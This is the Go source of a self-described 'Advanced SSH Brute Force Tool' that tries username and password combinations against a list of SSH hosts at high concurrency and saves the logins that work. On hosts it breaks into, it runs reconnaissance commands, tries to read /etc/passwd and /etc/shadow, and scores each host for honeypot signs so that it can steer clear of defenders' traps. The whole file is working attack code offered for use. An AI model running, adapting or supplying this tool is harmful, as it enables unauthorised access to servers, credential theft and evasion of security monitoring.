package main

import (
	"bufio"
	"fmt"
	"log"
	"math"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var startTime time.Time
var totalIPCount int
var stats = struct{ goods, errors, honeypots int }{0, 0, 0}
var ipFile string
var timeout int
var maxConnections int

var (
	successfulIPs = make(map[string]struct{})
	mapMutex      sync.Mutex
)

// Server information structure
type ServerInfo struct {
	IP              string
	Port            string
	Username        string
	Password        string
	IsHoneypot      bool
	HoneypotScore   int
	SSHVersion      string
	OSInfo          string
	Hostname        string
	ResponseTime    time.Duration
	Commands        map[string]string
	OpenPorts       []string
}

// Honeypot detection structure
type HoneypotDetector struct {
	SuspiciousPatterns []string
	TimeAnalysis       bool
	CommandAnalysis    bool
	NetworkAnalysis    bool
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	createComboFile(reader)
	fmt.Print("Enter the IP list file path: ")
	ipFile, _ = reader.ReadString('\n')
	ipFile = strings.TrimSpace(ipFile)

	fmt.Print("Enter the timeout value (seconds): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))

	fmt.Print("Enter the maximum number of concurrent connections: ")
	maxConnectionsStr, _ := reader.ReadString('\n')
	maxConnections, _ = strconv.Atoi(strings.TrimSpace(maxConnectionsStr))

	startTime = time.Now()

	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	var wg sync.WaitGroup
	tasks := make(chan func(), maxConnections)

	// Start workers
	for i := 0; i < maxConnections; i++ {
		go worker(&wg, tasks)
	}

	go banner()
	for _, combo := range combos {
		for _, ip := range ips {
			wg.Add(1)
			task := func(ip, combo []string) func() {
				return func() {
					checkSSH(ip[0], ip[1], combo[0], combo[1], timeout)
					wg.Done()
				}
			}(ip, combo)
			tasks <- task
		}
	}

	wg.Wait()
	close(tasks)
	banner()
	fmt.Println("Operation completed successfully!")
}

func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file: %s", err)
	}
	defer file.Close()

	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(reader *bufio.Reader) {
	fmt.Print("Enter the username list file path: ")
	usernameFile, _ := reader.ReadString('\n')
	usernameFile = strings.TrimSpace(usernameFile)
	fmt.Print("Enter the password list file path: ")
	passwordFile, _ := reader.ReadString('\n')
	passwordFile = strings.TrimSpace(passwordFile)

	usernames := getItems(usernameFile)
	passwords := getItems(passwordFile)

	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()

	for _, username := range usernames {
		for _, password := range passwords {
			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
		}
	}
}

func checkSSH(ip, port, username, password string, timeout int) {
	connectionStartTime := time.Now()
	
	// SSH connection configuration
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: time.Duration(timeout) * time.Second,
	}

	// Test connection
	client, err := ssh.Dial("tcp", ip+":"+port, config)
	if err == nil {
		defer client.Close()
		
		// Create server information
		serverInfo := &ServerInfo{
			IP:           ip,
			Port:         port,
			Username:     username,
			Password:     password,
			ResponseTime: time.Since(connectionStartTime),
			Commands:     make(map[string]string),
		}

		// Gather system information
		gatherSystemInfo(client, serverInfo)
		
		// Honeypot detection (BETA)
		detector := &HoneypotDetector{
			SuspiciousPatterns: []string{
				"cowrie", "kippo", "ssh-honeypot", "honeytrap",
				"fake", "simulation", "trap", "monitor",
			},
			TimeAnalysis:    true,
			CommandAnalysis: true,
			NetworkAnalysis: true,
		}
		
		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
		
		// Record result
		successKey := fmt.Sprintf("%s:%s", ip, port)
		mapMutex.Lock()
		if _, exists := successfulIPs[successKey]; !exists {
			successfulIPs[successKey] = struct{}{}
			if !serverInfo.IsHoneypot {
				stats.goods++
				logSuccessfulConnection(serverInfo)
			} else {
				stats.honeypots++
				log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", ip, port, serverInfo.HoneypotScore)
				appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
					ip, port, username, password, serverInfo.HoneypotScore), "honeypots.txt")
			}
		}
		mapMutex.Unlock()
		
	} else {
		stats.errors++
	}
}

// Gather system information
func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	commands := map[string]string{
		"hostname":    "hostname",
		"uname":       "uname -a",
		"whoami":      "whoami",
		"pwd":         "pwd",
		"ls_root":     "ls -la /",
		"ps":          "ps aux | head -10",
		"netstat":     "netstat -tulpn | head -10",
		"history":     "history | tail -5",
		"ssh_version": "ssh -V",
		"uptime":      "uptime",
		"mount":       "mount | head -5",
		"env":         "env | head -10",
	}

	for cmdName, cmd := range commands {
		output := executeCommand(client, cmd)
		serverInfo.Commands[cmdName] = output
		
		// Extract specific information
		switch cmdName {
		case "hostname":
			serverInfo.Hostname = strings.TrimSpace(output)
		case "uname":
			serverInfo.OSInfo = strings.TrimSpace(output)
		case "ssh_version":
			serverInfo.SSHVersion = strings.TrimSpace(output)
		}
	}
	
	// Scan local ports
	serverInfo.OpenPorts = scanLocalPorts(client)
}

// Execute command on server
func executeCommand(client *ssh.Client, command string) string {
	session, err := client.NewSession()
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	defer session.Close()

	output, err := session.CombinedOutput(command)
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	
	return string(output)
}

// Scan local ports
func scanLocalPorts(client *ssh.Client) []string {
	output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
	var ports []string
	
	lines := strings.Split(output, "\n")
	portRegex := regexp.MustCompile(`:(\d+)\s`)
	
	for _, line := range lines {
		matches := portRegex.FindAllStringSubmatch(line, -1)
		for _, match := range matches {
			if len(match) > 1 {
				port := match[1]
				if !contains(ports, port) {
					ports = append(ports, port)
				}
			}
		}
	}
	
	return ports
}

// Helper function to check existence in slice
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// Advanced honeypot detection algorithm (BETA)
func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
	honeypotScore := 0
	
	// 1. Analyze suspicious patterns in command output
	honeypotScore += analyzeCommandOutput(serverInfo, detector.SuspiciousPatterns)
	
	// 2. Analyze response time
	if detector.TimeAnalysis {
		honeypotScore += analyzeResponseTime(serverInfo)
	}
	
	// 3. Analyze file and directory structure
	honeypotScore += analyzeFileSystem(serverInfo)
	
	// 4. Analyze running processes
	honeypotScore += analyzeProcesses(serverInfo)
	
	// 5. Analyze network and ports
	if detector.NetworkAnalysis {
		honeypotScore += analyzeNetwork(serverInfo)
	}
	
	// 6. Behavioral tests
	honeypotScore += behavioralTests(client, serverInfo)
	
	// 7. Detect abnormal patterns
	honeypotScore += detectAnomalies(serverInfo)
	
	// 8. Advanced tests
	honeypotScore += advancedHoneypotTests(client)
	
	// 9. Performance tests
	honeypotScore += performanceTests(client)
	
	// Record score
	serverInfo.HoneypotScore = honeypotScore
	
	// Honeypot detection threshold: score 6 or higher
	return honeypotScore >= 6
}

// Analyze command output for suspicious patterns
func analyzeCommandOutput(serverInfo *ServerInfo, suspiciousPatterns []string) int {
	score := 0
	
	for _, output := range serverInfo.Commands {
		lowerOutput := strings.ToLower(output)
		
		// Check suspicious patterns
		for _, pattern := range suspiciousPatterns {
			if strings.Contains(lowerOutput, pattern) {
				score += 2
			}
		}
		
		// Check specific honeypot patterns
		honeypotIndicators := []string{
			"fake", "simulation", "honeypot", "trap", "monitor",
			"cowrie", "kippo", "artillery", "honeyd",
			"/opt/honeypot", "/var/log/honeypot",
		}
		
		for _, indicator := range honeypotIndicators {
			if strings.Contains(lowerOutput, indicator) {
				score += 3
			}
		}
	}
	
	return score
}

// Analyze response time
func analyzeResponseTime(serverInfo *ServerInfo) int {
	responseTime := serverInfo.ResponseTime.Milliseconds()
	
	// Very fast response time (less than 10 milliseconds) is suspicious
	if responseTime < 10 {
		return 2
	}
	
	// Very slow response time (more than 5 seconds) is also suspicious
	if responseTime > 5000 {
		return 1
	}
	
	return 0
}

// Analyze file system structure
func analyzeFileSystem(serverInfo *ServerInfo) int {
	score := 0
	
	lsOutput, exists := serverInfo.Commands["ls_root"]
	if !exists {
		return 0
	}
	
	// Check abnormal structure
	suspiciousPatterns := []string{
		"total 0",           // Empty directory is suspicious
		"total 4",           // Low file count
		"honeypot",          // Explicit name
		"fake",              // Fake files
		"simulation",        // Simulation
	}
	
	lowerOutput := strings.ToLower(lsOutput)
	for _, pattern := range suspiciousPatterns {
		if strings.Contains(lowerOutput, pattern) {
			score++
		}
	}
	
	// Low file count in root
	lines := strings.Split(strings.TrimSpace(lsOutput), "\n")
	if len(lines) < 5 { // Less than 5 files/directories in root
		score++
	}
	
	return score
}

// Analyze running processes
func analyzeProcesses(serverInfo *ServerInfo) int {
	score := 0
	
	psOutput, exists := serverInfo.Commands["ps"]
	if !exists {
		return 0
	}
	
	// Suspicious processes
	suspiciousProcesses := []string{
		"cowrie", "kippo", "honeypot", "honeyd",
		"artillery", "honeytrap", "glastopf",
		"python honeypot", "perl honeypot",
	}
	
	lowerOutput := strings.ToLower(psOutput)
	for _, process := range suspiciousProcesses {
		if strings.Contains(lowerOutput, process) {
			score += 2
		}
	}
	
	// Low process count
	lines := strings.Split(strings.TrimSpace(psOutput), "\n")
	if len(lines) < 5 {
		score++
	}
	
	return score
}

// Analyze network configuration
func analyzeNetwork(serverInfo *ServerInfo) int {
	score := 0
	
	// Check abnormal ports
	suspiciousPorts := []string{"2222", "2223", "2224", "8022", "9022"}
	
	for _, port := range serverInfo.OpenPorts {
		for _, suspiciousPort := range suspiciousPorts {
			if port == suspiciousPort {
				score++
			}
		}
	}
	
	// Low port count
	if len(serverInfo.OpenPorts) < 3 {
		score++
	}
	
	return score
}

// Behavioral tests
func behavioralTests(client *ssh.Client, serverInfo *ServerInfo) int {
	score := 0
	
	// Test 1: Create temporary file
	tempFileName := fmt.Sprintf("/tmp/test_%d", time.Now().Unix())
	createCmd := fmt.Sprintf("echo 'test' > %s", tempFileName)
	createOutput := executeCommand(client, createCmd)
	
	// If unable to create file, it's suspicious
	if strings.Contains(strings.ToLower(createOutput), "error") ||
	   strings.Contains(strings.ToLower(createOutput), "permission denied") {
		score++
	} else {
		// Delete test file
		executeCommand(client, fmt.Sprintf("rm -f %s", tempFileName))
	}
	
	// Test 2: Access to sensitive files
	sensitiveFiles := []string{"/etc/passwd", "/etc/shadow", "/proc/version"}
	accessibleCount := 0
	
	for _, file := range sensitiveFiles {
		output := executeCommand(client, fmt.Sprintf("cat %s 2>/dev/null | head -1", file))
		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
			accessibleCount++
		}
	}
	
	// If all files are accessible, it's suspicious
	if accessibleCount == len(sensitiveFiles) {
		score++
	}
	
	// Test 3: Test system commands
	systemCommands := []string{"id", "whoami", "pwd"}
	workingCommands := 0
	
	for _, cmd := range systemCommands {
		output := executeCommand(client, cmd)
		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
			workingCommands++
		}
	}
	
	// If no commands work, it's suspicious
	if workingCommands == 0 {
		score += 2
	}
	
	return score
}

// Advanced honeypot detection tests
func advancedHoneypotTests(client *ssh.Client) int {
	score := 0
	
	// Test 1: Check CPU and Memory
	cpuInfo := executeCommand(client, "cat /proc/cpuinfo | grep 'model name' | head -1")
	
	if strings.Contains(strings.ToLower(cpuInfo), "qemu") ||
	   strings.Contains(strings.ToLower(cpuInfo), "virtual") {
		score++ // May be a virtual machine
	}
	
	// Test 2: Check kernel and distribution
	kernelInfo := executeCommand(client, "uname -r")
	
	// Very new or old kernels are suspicious
	if strings.Contains(kernelInfo, "generic") && len(strings.TrimSpace(kernelInfo)) < 20 {
		score++
	}
	
	// Test 3: Check package management
	packageManagers := []string{
		"which apt", "which yum", "which pacman", "which zypper",
	}
	
	workingPMs := 0
	for _, pm := range packageManagers {
		output := executeCommand(client, pm)
		if !strings.Contains(output, "not found") && len(strings.TrimSpace(output)) > 0 {
			workingPMs++
		}
	}
	
	// If no package manager exists, it's suspicious
	if workingPMs == 0 {
		score++
	}
	
	// Test 4: Check system services
	services := executeCommand(client, "systemctl list-units --type=service --state=running 2>/dev/null | head -10")
	if strings.Contains(services, "0 loaded units") || len(strings.TrimSpace(services)) < 50 {
		score++
	}
	
	// Test 5: Check internet access
	internetTest := executeCommand(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
	if len(strings.TrimSpace(internetTest)) == 0 {
		// May not have internet access (suspicious for honeypot)
		score++
	}
	
	return score
}

// Performance and system behavior tests
func performanceTests(client *ssh.Client) int {
	score := 0
	
	// I/O speed test
	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1")
	if strings.Contains(ioTest, "real") {
		// Time analysis - if too fast it's suspicious
		if strings.Contains(ioTest, "0m0.") { // Less than 1 second
			score++
		}
	}
	
	// Clean up test file
	executeCommand(client, "rm -f /tmp/test")
	
	// Internal network test
	networkTest := executeCommand(client, "ss -tuln 2>/dev/null | wc -l")
	if networkTest != "" {
		if count, err := strconv.Atoi(strings.TrimSpace(networkTest)); err == nil {
			if count < 5 { // Low network connection count
				score++
			}
		}
	}
	
	return score
}

// Detect abnormal patterns
func detectAnomalies(serverInfo *ServerInfo) int {
	score := 0
	
	// Check hostname
	if hostname := serverInfo.Hostname; hostname != "" {
		suspiciousHostnames := []string{
			"honeypot", "fake", "trap", "monitor", "sandbox",
			"test", "simulation", "ubuntu", "debian", // Very generic names
		}
		
		lowerHostname := strings.ToLower(hostname)
		for _, suspicious := range suspiciousHostnames {
			if strings.Contains(lowerHostname, suspicious) {
				score++
			}
		}
	}
	
	// Check uptime
	uptimeOutput, exists := serverInfo.Commands["uptime"]
	if exists {
		// If uptime is very low (less than 1 hour), it's suspicious
		if strings.Contains(uptimeOutput, "0:") || 
		   strings.Contains(uptimeOutput, "min") {
			score++
		}
	}
	
	// Check command history
	historyOutput, exists := serverInfo.Commands["history"]
	if exists {
		lines := strings.Split(strings.TrimSpace(historyOutput), "\n")
		// Very little or empty history
		if len(lines) < 3 {
			score++
		}
	}
	
	return score
}

// Log successful connection
func logSuccessfulConnection(serverInfo *ServerInfo) {
	successMessage := fmt.Sprintf("%s:%s@%s:%s", 
		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
	
	// Save to main file
	appendToFile(successMessage+"\n", "su-goods.txt")
	
	// Save detailed information to separate file
	detailedInfo := fmt.Sprintf(`
=== SSH Success ===
Target: %s:%s
Credentials: %s:%s
Hostname: %s
OS: %s
SSH Version: %s
Response Time: %v
Open Ports: %v
Honeypot Score: %d
Timestamp: %s
==================
`, 
		serverInfo.IP, serverInfo.Port,
		serverInfo.Username, serverInfo.Password,
		serverInfo.Hostname,
		serverInfo.OSInfo,
		serverInfo.SSHVersion,
		serverInfo.ResponseTime,
		serverInfo.OpenPorts,
		serverInfo.HoneypotScore,
		time.Now().Format("2006-01-02 15:04:05"),
	)
	
	appendToFile(detailedInfo, "detailed-results.txt")
	
	// Display success message in console
	fmt.Printf("✅ SUCCESS: %s\n", successMessage)
}

func banner() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for range ticker.C {
		totalConnections := stats.goods + stats.errors + stats.honeypots
		elapsedTime := time.Since(startTime).Seconds()
		connectionsPerSecond := float64(totalConnections) / elapsedTime
		estimatedRemainingTime := float64(totalIPCount-totalConnections) / connectionsPerSecond

		clear()

		fmt.Printf("================================================\n")
		fmt.Printf("🚀 Advanced SSH Brute Force Tool 🚀\n")
		fmt.Printf("================================================\n")
		fmt.Printf("📁 File: %s | ⏱️  Timeout: %ds\n", ipFile, timeout)
		fmt.Printf("🔗 Max Connections: %d\n", maxConnections)
		fmt.Printf("================================================\n")
		fmt.Printf("🔍 Checked SSH: %d/%d\n", totalConnections, totalIPCount)
		fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)
		
		if totalConnections < totalIPCount {
			fmt.Printf("⏳ Elapsed: %s\n", formatTime(elapsedTime))
			fmt.Printf("⏰ Remaining: %s\n", formatTime(estimatedRemainingTime))
		} else {
			fmt.Printf("⏳ Total Time: %s\n", formatTime(elapsedTime))
			fmt.Printf("✅ Scan Completed Successfully!\n")
		}
		
		fmt.Printf("================================================\n")
		fmt.Printf("✅ Successful: %d\n", stats.goods)
		fmt.Printf("❌ Failed: %d\n", stats.errors)
		fmt.Printf("🍯 Honeypots: %d\n", stats.honeypots)
		
		if totalConnections > 0 {
			fmt.Printf("📊 Success Rate: %.2f%%\n", float64(stats.goods)/float64(totalConnections)*100)
			fmt.Printf("🍯 Honeypot Rate: %.2f%%\n", float64(stats.honeypots)/float64(totalConnections)*100)
		}
		
		fmt.Printf("================================================\n")
		fmt.Printf("| 💻 Coded By SudoLite with ❤️  |\n")
		fmt.Printf("| 🔥 Enhanced Honeypot Detection 🔥 |\n")
		fmt.Printf("| 🛡️  No License Required 🛡️   |\n")
		fmt.Printf("================================================\n")

		if totalConnections >= totalIPCount {
			os.Exit(0)
		}
	}
}

func worker(wg *sync.WaitGroup, tasks chan func()) {
	for task := range tasks {
		task()
	}
}

func formatTime(seconds float64) string {
	days := int(seconds) / 86400
	hours := (int(seconds) % 86400) / 3600
	minutes := (int(seconds) % 3600) / 60
	seconds = math.Mod(seconds, 60)
	return fmt.Sprintf("%02d:%02d:%02d:%02d", days, hours, minutes, int(seconds))
}

func appendToFile(data, filepath string) {
	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Failed to open file for append: %s", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		log.Printf("Failed to write to file: %s", err)
	}
}
